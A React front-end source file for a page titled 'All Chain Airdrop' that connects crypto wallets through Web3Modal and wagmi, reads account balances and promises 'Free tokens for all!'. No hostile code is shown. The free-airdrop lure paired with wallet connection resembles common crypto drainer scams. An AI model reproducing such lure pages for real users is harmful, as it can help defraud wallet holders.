import { createWeb3Modal } from '@web3modal/wagmi/react'
import { http, createConfig, WagmiProvider } from 'wagmi'
import { mainnet, sepolia, bscTestnet } from 'wagmi/chains'
import { walletConnect, injected, coinbaseWallet } from 'wagmi/connectors'
import { QueryClient, QueryClientProvider } from '@tanstack/react-query'
import ConnectButton from "./components/ConnectButton";
import './App.css'
import { config } from '../wagmiConfig'
import UseAccountBalances from './components/UseAccountBalances'

// 0. Setup queryClient
const queryClient = new QueryClient()

const projectId = '243060104b273e0c5af1209e5f4a34dd'




// 3. Create modal
createWeb3Modal({
  wagmiConfig: config,
  projectId,
  enableAnalytics: true // Optional - defaults to your Cloud configuration
})



function App() {
  return (
    <WagmiProvider config={config}>
      <QueryClientProvider client={queryClient}>
        <div className="center">
          <h1>All Chain Airdrop</h1>
          <div className="card " >
            <ConnectButton/>
          </div>
          <p className="read-the-docs">
            Free tokens for all! Grab your share now!{" "}
          </p>
          <UseAccountBalances/>
        </div>
      </QueryClientProvider>
    </WagmiProvider>
  );
}

export default App;
